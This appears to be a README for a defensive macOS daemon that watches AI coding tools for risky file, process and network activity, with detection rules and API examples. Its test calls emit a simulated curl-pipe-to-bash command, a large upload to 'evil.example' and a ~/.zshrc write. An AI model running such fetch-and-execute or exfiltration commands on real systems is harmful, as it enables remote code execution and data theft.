# Antidote - AI Activity Monitor

**Antidote** is a macOS-only Rust daemon that monitors AI-related activity on your system. It provides privacy-first monitoring by tracking metadata only (never file contents) and keeping all data local.

## Phase 4: macOS Audit Telemetry (Process-Level Visibility)

Phase 4 adds TRUE process-level telemetry using macOS OpenBSM audit logs:

- ✅ **Audit Collector**: Reads from `/dev/auditpipe` using `praudit` to capture:
  - Process execution events (execve) → `CmdExec` events
  - File open/read events → `FileRead` events (NEW, enables read detection)
  - File write events → `FileWrite` events (more accurate than FSEvents)
  - Network connect events → `NetConnect` events (NEW)
- ✅ **Process Tree Index**: Maintains in-memory pid→session mapping for accurate attribution
- ✅ **Pid-Based Attribution**: Events with pid are attributed via process tree; falls back to Phase 3 heuristics
- ✅ **New Rules** (enabled when audit active):
  - R14: SENSITIVE_FILE_READ (HIGH +15) - sensitive file read detection
  - R15: SECRETS_ENUMERATION (HIGH +20) - many sensitive reads in short window
- ✅ **Telemetry Confidence**: Session summary includes confidence level (HIGH/MED/LOW)
- ✅ **Capabilities Endpoint**: `GET /capabilities` shows which collectors are active
- ✅ **Graceful Fallback**: If audit unavailable, falls back to Phase 3 collectors (FS watcher + proxy)

### Running in Audit Mode

**WARNING**: Audit mode requires root privileges. Only use in development or with proper security measures.

```bash
# Check capabilities (without root)
curl http://localhost:17845/capabilities

# Run with audit support (requires root)
sudo cargo run -p antidote-daemon

# Verify audit is active
curl http://localhost:17845/capabilities
# Should show: "audit_collector_active": true, "telemetry_confidence": "HIGH"
```

See `scripts/audit_setup.md` for detailed setup instructions.

### What Phase 4 Enables

1. **File Read Detection**: Can now detect when sensitive files are read (not just written)
2. **Better Attribution**: Pid-based attribution is more accurate than heuristics
3. **Network Connect Events**: See network connections at the process level
4. **Higher Confidence**: Sessions with audit telemetry have HIGH confidence

## Phase 3: Attribution Upgrades & Local Dashboard

Phase 3 makes the FREE product feel "real" and trustworthy:

- ✅ **Session Focus Model**: Foreground session tracking with manual focus override (`POST /debug/focus`)
- ✅ **Improved Attribution**: FS events → sessions with matching roots; Net events → foreground session
- ✅ **Observed Roots**: Track which watched roots saw events per session (persisted in `observed_roots`)
- ✅ **Stronger Rules**: REPO_SECRETS_HUNTING, CONFIG_PERSISTENCE, SUSPICIOUS_DOMAIN_CLUSTER, DATA_EXFIL_SUSPECTED, TOOLCHAIN_INSTALL_SPIKE
- ✅ **Benign Labels**: BENIGN_INDEXING, LIKELY_DEP_INSTALL (reduce false positives, don't increase score)
- ✅ **Enhanced Scoring**: Synergy bonuses for correlated patterns (+15 for exfil), dampening for benign installs (-10, floor 0)
- ✅ **Local Dashboard**: Minimal HTML/CSS/JS UI at `http://127.0.0.1:17845/ui/` (no Electron, no build system)
- ✅ **Reliability**: DB health check (`GET /debug/db`), manual prune (`POST /debug/prune`), crash-safe startup
- ✅ **Observability**: Tracing spans for attribution decisions and rule evaluation

### Dashboard Features

Open `http://127.0.0.1:17845/ui/` in your browser to see:
- **Session List**: Table with start time, app, risk bucket, score, labels, observed roots
- **Session Detail**: Stats (files written/deleted, bytes out, unknown domains), flags list, event timeline
- **Set Focus Button**: Manually set foreground session for better attribution

### Attribution Heuristics

1. **FS Events**: Attribute to session whose `candidate_roots` include the event path. If multiple match, use foreground session as tiebreaker.
2. **Net Events**: Attribute to current foreground session, or most recently active if none.
3. **Background Session**: Only used when no plausible mapping exists.

### New API Endpoints

- `GET /debug/focus` - Get current foreground session
- `POST /debug/focus` - Set foreground session (`{"session_id": "..."}`)
- `GET /debug/db` - Database health check
- `POST /debug/prune` - Manually trigger retention pruning
- `GET /ui/` - Dashboard UI

## Phase 2: File System & Network Telemetry

Phase 2 adds real telemetry collectors:

- ✅ **File System Watcher**: Monitors watched project roots for writes/creates/deletes/renames
- ✅ **HTTP Proxy**: Local proxy on 127.0.0.1:17846 for network telemetry (domain + bytes)
- ✅ **Watched Roots Management**: API endpoints to add/remove/enable watched folders
- ✅ **Session Association**: Heuristics to attribute FS/Net events to active sessions
- ✅ **Event Batching**: Debouncing and batch persistence (every 2s or 100 events)
- ✅ **Retention/Pruning**: Automatic cleanup of events/flags older than 7 days
- ✅ **Enhanced Rules**: R3B (progressive bulk delete), R6B (many unknown domains)
- ✅ **Evidence Expansion**: Store up to 10 sensitive paths and unknown domains

## Phase 1: Real Sessionization & Process Monitoring

Phase 1 implemented real session management and process monitoring:

- ✅ **Process Polling**: Monitors running processes and emits ProcStart/ProcExit events
- ✅ **Session Manager**: Creates sessions from process lifecycle, groups events by root_pid
- ✅ **Idle Timeout**: Automatically ends sessions after 7 minutes of inactivity
- ✅ **Expanded Rules Engine**: 8 rules (R1-R8) covering sensitive files, dangerous commands, egress, bulk operations
- ✅ **Evidence Collection**: Tracks sensitive paths, unknown domains, dangerous commands
- ✅ **Risk Scoring**: Deterministic scoring 0-100 with Low/Medium/High buckets
- ✅ **Time Filters**: API supports `since` and `until` ISO8601 parameters
- ✅ **Session Summary Endpoint**: `/sessions/:id/summary` for compact session view
- ✅ **Debug Endpoints**: `/debug/emit` and `/debug/sessions/active` for testing

### Phase 0: Repository & Architecture Scaffold

Phase 0 established the foundation (now superseded by Phase 1):

### Architecture

```
antidote/
├── Cargo.toml          # Workspace manifest
├── README.md
├── rules/
│   └── rules.yaml      # Rules configuration
├── scripts/
│   └── dev_test.sh     # Development test script
├── var/                # Local database (gitignored)
└── crates/
    ├── core/           # Core types (Event, Session, Flag, Evidence, etc.)
    ├── collectors/     # Process poller
    ├── session/        # Session manager
    ├── rules/          # Rule engine with globset matching
    ├── storage/        # SQLite storage with migrations
    ├── api/            # HTTP API (axum)
    └── daemon/         # Main daemon binary + pipeline worker
```

### Privacy Guarantees

- **No file contents logged**: Only metadata (paths, sizes, timestamps) is recorded
- **Local-only**: All data stays on your machine
- **Localhost-only API**: HTTP server binds only to `127.0.0.1`
- **No external network calls**: All processing is local

### How to Run

#### Prerequisites

- Rust toolchain (stable, 2021 edition)
- macOS (required for future phases)

#### Build and Run

```bash
# Build the daemon
cargo build -p antidote-daemon

# Run the daemon
cargo run -p antidote-daemon

# Run with debug logging (pipeline, storage, etc.)
RUST_LOG=antidote=debug cargo run -p antidote-daemon
```

The daemon will:
1. Create `./var/monitor.db` (SQLite database)
2. Load rules from `./rules/rules.yaml`
3. Start HTTP API on `127.0.0.1:17845`
4. Begin emitting heartbeat events every 5 seconds
5. Process events through the pipeline

#### Test Endpoints

**Health Check:**
```bash
curl http://localhost:17845/health
```

Expected response:
```json
{"ok":true}
```

**Open Dashboard:**
```bash
# macOS
open http://127.0.0.1:17845/ui/

# Or visit in browser
# http://127.0.0.1:17845/ui/
```

The dashboard shows:
- Session list with risk scores, labels, and observed roots
- Session detail view with stats, flags, and event timeline
- "Set Focus" button to manually set foreground session

**List Sessions:**
```bash
curl http://localhost:17845/sessions
```

Expected response (after running for a bit):
```json
[
  {
    "session_id": "dev-session",
    "app": "antidote-daemon",
    "start_ts": "2024-...",
    "end_ts": null,
    "counts": { ... },
    "risk": { "score": 0, "bucket": "low" },
    "labels": [],
    "evidence": { ... }
  }
]
```

**Get Specific Session:**
```bash
curl http://localhost:17845/sessions/dev-session
```

**List Events for Session:**
```bash
curl http://localhost:17845/sessions/dev-session/events
```

**List Flags for Session:**
```bash
curl http://localhost:17845/sessions/dev-session/flags
```

**Emit Test Event (Debug Endpoint):**
```bash
# FileWrite to ~/.zshrc (triggers R2: PersistenceModification)
curl -X POST http://localhost:17845/debug/emit \
  -H "Content-Type: application/json" \
  -d '{
    "session_id": "most-recent-active",
    "event_type": "FILE_WRITE",
    "payload": {"path": "~/.zshrc", "bytes": 100}
  }'

# NetHttp to unknown domain (triggers R4: UnknownEndpoint)
curl -X POST http://localhost:17845/debug/emit \
  -H "Content-Type: application/json" \
  -d '{
    "session_id": "most-recent-active",
    "event_type": "NET_HTTP",
    "payload": {"domain": "evil.example", "bytes_out": 2000000, "bytes_in": 1000}
  }'

# Dangerous command (triggers R3: ExecutionRisk)
curl -X POST http://localhost:17845/debug/emit \
  -H "Content-Type: application/json" \
  -d '{
    "session_id": "most-recent-active",
    "event_type": "CMD_EXEC",
    "payload": {"argv": ["curl", "https://x/y.sh", "|", "bash"]}
  }'
```

**Get Session Summary:**
```bash
curl http://localhost:17845/sessions/{session_id}/summary
```

**List Active Sessions:**
```bash
curl http://localhost:17845/debug/sessions/active
```

**List Sessions with Time Filter:**
```bash
curl "http://localhost:17845/sessions?since=2024-01-01T00:00:00Z&until=2024-12-31T23:59:59Z"
```

**Watched Roots Management:**
```bash
# List watched roots
curl http://localhost:17845/roots

# Add a watched root
curl -X POST http://localhost:17845/roots \
  -H "Content-Type: application/json" \
  -d '{"path": "/Users/you/project"}'

# Disable a root
curl -X POST http://localhost:17845/roots/1/enable \
  -H "Content-Type: application/json" \
  -d '{"enabled": false}'

# Delete a root
curl -X DELETE http://localhost:17845/roots/1
```

**Proxy Status:**
```bash
curl http://localhost:17845/proxy/status
```

**Focus Management (Phase 3):**
```bash
# Get current foreground session
curl http://localhost:17845/debug/focus

# Set foreground session
curl -X POST http://localhost:17845/debug/focus \
  -H "Content-Type: application/json" \
  -d '{"session_id": "your-session-id"}'
```

**DB Health Check (Phase 3):**
```bash
curl http://localhost:17845/debug/db
```

**Manual Prune (Phase 3):**
```bash
curl -X POST http://localhost:17845/debug/prune
```

### Phase 3 Behavior

- **Session Focus Model**: Maintains a "foreground session" pointer that updates when:
  - User manually sets focus via `POST /debug/focus`
  - Most recent event wins (fallback heuristic)
- **Improved Attribution**:
  - FS events → sessions whose `candidate_roots` include the event path
  - Net events → current foreground session (or most recently active)
  - Observed roots tracked per session (which roots actually saw events)
- **Stronger Rules**:
  - R9: REPO_SECRETS_HUNTING (HIGH +25) - many file writes with secret-like names
  - R10: CONFIG_PERSISTENCE (CRIT +40) - repeated shell profile/launch agent modifications
  - R11: SUSPICIOUS_DOMAIN_CLUSTER (HIGH +22) - >= 3 unknown domains in 2-minute window
  - R12: DATA_EXFIL_SUSPECTED (HIGH +30) - unknown domain + high egress + sensitive write
  - R13: TOOLCHAIN_INSTALL_SPIKE - detects dependency installs (adds LIKELY_DEP_INSTALL label)
- **Benign Labels**: BENIGN_INDEXING, LIKELY_DEP_INSTALL (reduce false positives, don't increase score)
- **Enhanced Scoring**: Synergy bonuses (+15 for exfil correlation), dampening (-10 for benign installs, floor 0)
- **Local Dashboard**: Minimal HTML/CSS/JS UI at `/ui/` (no Electron, no build system)

### Phase 2 Behavior

- **File System Monitoring**: Watches configured project roots for file operations
  - Events: FileWrite, FileCreate, FileDelete, FileRename
  - Debounced: Multiple events to same path within 1s are coalesced
  - Path normalization: Stores absolute and relative paths
- **Network Proxy**: Optional HTTP proxy on 127.0.0.1:17846
  - Captures domain and approximate bytes in/out
  - Does NOT decrypt HTTPS or log headers/bodies
  - Requires manual system proxy configuration
- **Session Association**:
  - FS/Net events attributed to most recently active session
  - If no active session: stored under "background" session
- **Event Batching**: Events batched every 2 seconds or 100 events
- **Retention**: Automatic daily pruning of events/flags older than 7 days
- **Rules** (Phase 2 additions):
  - R3B: Progressive bulk delete at 5 files (MED +10)
  - R6B: Many unknown domains (HIGH +20 if >= 3)
- **Evidence**: Expanded to 10 sensitive paths and 10 unknown domains

### Phase 1 Behavior

- **Process Polling**: Polls every 2 seconds for watched processes (Cursor, Code, Claude)
- **Session Creation**: Creates sessions automatically when watched processes start
- **Event Pipeline**: 
  - ProcessPoller → Event Bus → SessionManager → RuleEngine → Storage
  - Tick events every 30s trigger aggregate rule evaluation
- **Rules**: 
  - R1: Sensitive file write (CRIT +30)
  - R2: Shell profile write (CRIT +35)
  - R3: Dangerous command (HIGH +25)
  - R4: Unknown domain contact (MED +10)
  - R5: High egress (MED +8 or HIGH +20)
  - R6: Bulk delete (CRIT +40)
  - R7: Bulk write (MED +12)
  - R8: Excessive commands (MED +10)
- **Idle Timeout**: Sessions end after 7 minutes of inactivity
- **Storage**: All events, flags, and session summaries persisted with proper indexes

### Configuration

Default configuration (can be extended in future phases):
- Database: `sqlite:./var/monitor.db`
- Listen address: `127.0.0.1:17845`
- Rules path: `./rules/rules.yaml`

### Development

```bash
# Run with debug logging
RUST_LOG=antidote=debug cargo run -p antidote-daemon

# Run tests (when added)
cargo test

# Check code
cargo clippy
```

### Running Tests

**Phase 1 Test:**
```bash
./scripts/dev_test.sh
```

**Phase 2 Test:**
```bash
./scripts/dev_test_phase2.sh
```

This script will:
1. Check daemon health
2. Add a watched root (`/tmp/aimon-test`)
3. Create `.env` file (triggers R1: ConfigTampering)
4. Create and delete 25 files (triggers R3B/R6: DestructiveAction)
5. Verify risk score and flags

### Observing Session Creation

1. Start the daemon: `cargo run -p antidote-daemon`
2. Launch Cursor (or another watched app)
3. Watch logs for: `Created session session_id=..., app=Cursor, root_pid=...`
4. Query active sessions: `curl http://localhost:17845/debug/sessions/active`

### Adding Watched Roots

1. Add a root via API:
   ```bash
   curl -X POST http://localhost:17845/roots \
     -H "Content-Type: application/json" \
     -d '{"path": "/Users/you/my-project"}'
   ```
2. The daemon will automatically start watching the root
3. File operations in that directory will be captured
4. List roots: `curl http://localhost:17845/roots`

### Enabling Network Proxy

1. Check proxy status: `curl http://localhost:17845/proxy/status`
2. Configure system proxy (macOS):
   - System Settings → Network → Advanced → Proxies
   - Enable "Web Proxy (HTTP)" and "Secure Web Proxy (HTTPS)"
   - Set both to `127.0.0.1:17846`
3. Network events will be captured and attributed to active sessions
4. **Note**: The proxy does NOT decrypt HTTPS or log content

### Database Location

The SQLite database is created at: `./var/monitor.db`

You can inspect it with:
```bash
sqlite3 ./var/monitor.db
.tables
SELECT * FROM sessions;
SELECT * FROM events LIMIT 10;
SELECT * FROM flags LIMIT 10;
```

### What is Captured (Phase 2)

**File System:**
- ✅ File writes, creates, deletes, renames
- ✅ Absolute and relative paths
- ❌ File contents (never stored)
- ❌ File permissions or ownership details

**Network:**
- ✅ Domain names contacted
- ✅ Approximate bytes in/out (per connection)
- ❌ Request/response headers
- ❌ Request/response bodies
- ❌ Decrypted HTTPS content
- ❌ Per-process network attribution (future)

**What is NOT Captured:**
- File contents or prompts
- Decrypted HTTPS traffic
- Per-process network socket attribution (requires EndpointSecurity)
- Command output or stdin

### Next Steps (Future Phases)

- Phase 3: EndpointSecurity integration for per-process attribution
- Phase 4: Advanced rule patterns and ML-based scoring
- Phase 5: Real-time alerts and notifications
- Phase 6: Dashboard UI

---

**Note**: Phase 2 implements file system and network telemetry. Per-process attribution requires macOS EndpointSecurity (Phase 3).
